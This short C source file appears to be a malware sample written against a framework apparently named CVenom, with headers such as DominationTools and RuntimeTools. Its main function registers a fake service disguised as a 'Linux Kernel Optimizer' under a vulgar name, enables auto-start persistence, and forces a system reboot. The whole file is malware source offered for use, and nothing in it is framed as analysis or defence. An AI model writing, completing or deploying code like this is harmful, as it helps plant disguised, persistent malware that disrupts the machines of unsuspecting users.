#include "../../CVenom.h"
#include "../../DominationTools.h"
#include "../../RuntimeTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	SetMalwareFakeService("sadmotherfucker");
	SetMalwareFakeDescription("Linux Kernel Optimizer");


	DominationTools Dom;
	RuntimeTools	Run;

	Dom.EnableAutoStart();
	Run.SystemExecute("reboot");

	cvexit(MALWARE_EXIT);
}
